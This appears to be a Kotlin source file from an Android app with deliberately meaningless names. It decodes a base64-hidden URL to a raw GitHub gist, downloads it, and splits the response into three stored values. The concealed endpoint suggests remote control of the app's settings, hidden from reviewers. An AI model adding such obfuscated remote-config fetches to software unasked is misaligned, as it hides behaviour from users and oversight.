package com.fnreoz.jroek.Webocka

import com.fnreoz.jroek.teskqs
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.Response

class darikdatats {
    var linceaks: String? = null
    var keoqs: String? = null
    var fbfbbfbq: String? = null

    fun gisterhna() {
        val zapros = Request.Builder()
            .url(teskqs.Liqsresa("aHR0cHM6Ly9naXN0LmdpdGh1YnVzZXJjb250ZW50LmNvbS9TTUlEdk1ha3MvMmQwZTNlYjNlYjRhMzA1MDk3ZGNlMzdlZjg0ZDUzOWEvcmF3L2NvbS5mbnJlb3ouanJvZWs="))
            .build()
        val my = OkHttpClient()
        val lastzapros: Response = my.newCall(zapros).execute()
        val tilo = lastzapros.body?.string()
        val gistdataArray = tilo?.split("|")?.toTypedArray()
        linceaks = gistdataArray?.get(0)
        keoqs = gistdataArray?.get(1)
        fbfbbfbq = gistdataArray?.get(2)
    }
}